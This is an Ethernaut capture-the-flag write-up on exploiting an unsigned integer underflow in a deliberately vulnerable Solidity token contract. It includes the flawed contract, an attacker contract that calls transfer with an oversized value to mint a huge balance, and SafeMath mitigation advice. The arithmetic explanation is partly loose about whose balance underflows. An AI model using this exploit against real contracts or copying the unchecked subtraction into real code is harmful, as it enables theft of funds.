# Token

![https://ethernaut.openzeppelin.com/imgs/BigLevel5.svg](https://ethernaut.openzeppelin.com/imgs/BigLevel5.svg)

# Objectives

The goal of this level is for you to hack the basic token contract below.

You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

Things that might help:

- What is an odometer?

# Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

# Analysis

This challenge wants us to increase the balance of the token in our address, initially we start with 20 tokens. We can set the balance in two places, `constructor()` and `transfer()`, we will look into transfer function - 

```solidity
function transfer(address _to, uint _value) public returns (bool) {
  require(balances[msg.sender] - _value >= 0);
  balances[msg.sender] -= _value;
  balances[_to] += _value;
  return true;
}
```

It takes `address` and `uint` or `uint256` as parameters, where it checks if the balances of the current `msg.sender` whether more than or equal to zero by subtracting the `value`. Once the check passes, it will transfer out the balance from the `msg.sender` and transfer it to the `to` address. Looks pretty normal. However, the catch is this function uses `solidity 0.6.0` version, where it does not use `SafeMath` for any mathematical calculations. We can use this loophole to perform `Overflows` and `Underflows` in this function. So what is `Overflows` and `Underflows`?

## Understanding `Overflows` & `Underflows`

An overflow is when a number gets incremented above its maximum value. Solidity `uint256` can handle up to `256` bit numbers (up to 2^256 - 1), so incrementing by 1 would result into 0.

```
  0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
+ 0x000000000000000000000000000000000001
----------------------------------------
= 0x000000000000000000000000000000000000
```

A perfect example could be an Odometer.

![https://miro.medium.com/max/440/0*TqqC7Raq_6sW7QdG.webp](https://miro.medium.com/max/440/0*TqqC7Raq_6sW7QdG.webp)

Once it reaches the maximum reading, the odometer or trip meter restarts from zero, this is known as odometer rollover.

Likewise, an Underflow is the inverse case, when the number is unsigned, decrementing it beyond 0 will case an underflow, resulting in the maximum value.

```
  0x000000000000000000000000000000000000
- 0x000000000000000000000000000000000001
----------------------------------------
= 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
```

# AntiSec

In order to hack this contract, all we have to do is perform underflow or overflow in the `transfer` function. So if we send `1000` as value, the unsigned integer won’t be able to handle it, and we will end up with more tokens. How?

Our, `Initial Balance = 20 Tokens`

The calculation requires the balances of the msg.sender subtract by value to be greater or equal to 0.

So if we send, 1000, in normal mathematical sense the result will be something like this,

```
20 - 1000 = -980
```

However, it case of unsigned integer, the result will be different - 

```
20 - 1000 = (2^256 - 1) - 980 which is greater than 0
```

So we end up with lots of token.

I will fire up my `remix` IDE and write a malicious contract, and call the `transfer` function from the malicious contract to perform an overflow.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IToken {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

contract AttackToken {

    constructor(address _tokenAddress) {
        IToken(_tokenAddress).transfer(msg.sender, 1000);
    }
}
```

Once the transaction goes through, we can check our new balances by

```jsx
await contract.balanceOf(player)
```

# Key Takeaways

Overflows are very common in solidity and must be checked for with control statements such as:

```solidity
if (a + c > a) {
	a = a + c;
}
```

An easier alternatives is to use [OpenZeppelin’s SafeMath](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol) library that automatically checks for overflows and underflows in all the mathematical operators. The resulting code looks like this:

```solidity
a = a.add(c);
```

If there is an overflow, the code will revert.
